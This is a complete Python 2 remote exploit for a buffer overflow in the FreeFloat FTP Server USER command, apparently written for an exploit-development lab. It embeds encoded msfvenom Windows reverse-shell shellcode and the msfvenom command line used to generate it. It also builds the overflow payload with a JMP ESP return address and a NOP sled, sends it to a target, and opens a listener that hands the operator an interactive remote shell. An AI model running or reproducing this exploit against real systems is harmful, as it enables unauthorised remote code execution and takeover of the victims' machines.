#!/usr/bin/env python2
import socket, argparse, sys, os, struct, time

##Using: https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip

sc = ("\xd9\xec\xb8\x3a\xb6\x6f\xc8\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x5f\x31\x43\x19\x03\x43\x19\x83\xeb\xfc\xd8\x43\xd4\x26\x38"
"\xdf\x85\x6e\xae\xc6\xae\xb4\xda\xa4\x7d\x7c\x93\x0f\xb3\x23"
"\xc6\x2c\x76\xdf\xeb\x6f\x68\x02\xf0\x70\x2e\xd4\xfb\x21\x13"
"\xfb\xdb\xe5\x8a\xa3\x5f\x0b\x7d\x45\x35\x48\x77\x20\x40\x50"
"\x96\x41\x2f\xcf\xc1\xcb\x42\xb3\x8a\x55\x39\xbb\xab\xf1\x59"
"\x11\xf1\x2b\x5d\x9e\x02\xbf\xbf\xb6\x55\xf6\x13\x22\xf7\x60"
"\x6a\x40\xed\x70\x11\x12\x02\x19\xeb\x97\x8a\xf7\x48\x33\x97"
"\x6d\x4b\x3d\x44\x74\x58\x4c\x15\x83\x57\x09\x1a\x45\x23\xac"
"\xd5\x96\x93\x3b\xa6\xe2\x06\x81\x92\x20\xed\xaa\xed\x83\x92"
"\xa2\x75\x70\x42\x7d\x8a\x46\xf9\x26\x19\x97\x84\x47\x17\x8e"
"\x30\x87\xb7\x27\x31\xfb\x81\xe9\x26\x9f\xab\x45\xc7\x8a\xe9"
"\xdc\xb4\x7b\x42\xe4\xb6\xf5\x3f\x55\xeb\xe5\x98\xd9\x76\x58"
"\xee\x94\xe7\x1d\xd2\x4e\xd6\xe4\xf6\x45\x22\x3a\x8f\xee\x81"
"\x27\x74\x81\x62\xd0\xe7\xd0\x64\x0f\x3a\x39\xfd\x93\x73\x1c"
"\x84\x09\x9d\xa8\x6d\xc3\x5e\xec\xd7\xd8\x48\x7d\x5e\x75\x13"
"\xbd\xd1\xb0\x27\x6b\x22\xd8\x6b\xba\x75\x9c\x62\x21\x92\xae"
"\x20\x6c\xd9\xd1\x6d\x46\xa0\x92\xeb\x76\x80\x38\x9b\x7e\x8e"
"\xea\x08\x66\x74\x75\xb7\x72\xba\x24\xa4\xdc\xd6\x3e\xc3\x63"
"\x2f\xe2\xbe\x92\x37\xda\x20\xff\xe1\xcc\x43\x1f\x3a\xc7\xf9"
"\x29\x82\x60\x0f\xda\xa9\xf0\x70\x33\xfd\xc8\x11\xb5\x18\x7d"
"\x75\xa8\xcf\xdc\x51\xb8\x82\x83\xc0\xea\x87\x01\x5b\x54\x46"
"\x89\x4b\xf0\x06\x62\x17\xb8\x4d\x0c\xf1\x69\xd5\xaf\x6e\x7f"
"\x26\x05\xc3\x48\xc8\x3c\xe3\xe3\xcd\x0e\xe4\x07\x91\x45\x39"
"\x13\xce\x6f\x0c\x93\xc1\x6d\x87\xb3\x83\xf9\xfe\x17\xb5\x4b"
"\x62\x2b\x81\xb1\xbf\xca\x1e\xbe\x3f\xbf\x89\x83\xe5\x21\x1e"
"\xef\x25\x2b\x70\xdf\x3c\x28\x1a\x2f\x92\x53\xf2\x31\x49\xaf") # 405 bytes
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.180 LPORT=443 EXITFUNC=thread -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -b "\x00\x0a\x0d" -f c


def getargs():
    ap = argparse.ArgumentParser(description="FreeFloat FTP BOF. Send BOF+RCE, wait for connect back")
    ap.add_argument('-ri', '--remoteip', type=str, default=None, help="Target IP")
    ap.add_argument('-rp', '--remoteport', type=int, default=21, help="Target port (defaults to 21)")
    ap.add_argument('-li', '--localip', type=str, default=None, help="Local listener BIND ip")
    ap.add_argument('-lp', '--localport', type=int, default=None, help="Local listener BIND port")
    args, l = ap.parse_known_args()
    if (args.remoteip == None or args.localip == None or args.localport == None):
        ap.print_help()
        sys.exit()
    return args.remoteip, args.remoteport, args.localip, args.localport


def connect(ri, rp):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("[.] Connecting to host %s:%s" % (ri, rp))
        s.connect((ri, int(rp)))
        return s
    except:
        print("[!] Failed to connect: %s" % ri)
        sys.exit()


def gen_payload():
    lead_in = "\x41" * 230
    nopsled = "\x90" * 41
    # 0x77e3171b FFE4 JMP ESP ntdll.dll Windows XP Pro Sp0
    ret = struct.pack('<L', 0x77e3171b)
    crash = lead_in + ret + nopsled + sc
    return crash


def snd_payload(sock, payload):
    print("[.] Sending payload of size %d" % (len(payload)))
    sock.send("USER " +payload+ "\r\n")
    time.sleep(4)
    sock.close()


def cx_back_listener(lh, lp):
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((lh, int(lp)))
        srv.listen(1)
        print("[!] Started listener on local bind: %s:%s" % (lh, str(lp)))
        client, addr = srv.accept()
        print("[!] Accepted connection from %s" % addr[0])
        while True:
            cmd = raw_input("~$ ")
            comm = client.send(cmd + "\r\n")
            data = client.recv(16834)
            if data <> "":
                print(data)
    except Exception, e:
        print(str(e))
    finally:
        client.close()
        srv.close()


def main():
    ri, rp, li, lp = getargs()
    try:
        sock = connect(ri, rp)
        snd_payload(sock, gen_payload())
        cx_back_listener(li,lp)
    except Exception, e:
        print(str(e))


if __name__=="__main__":
    main()



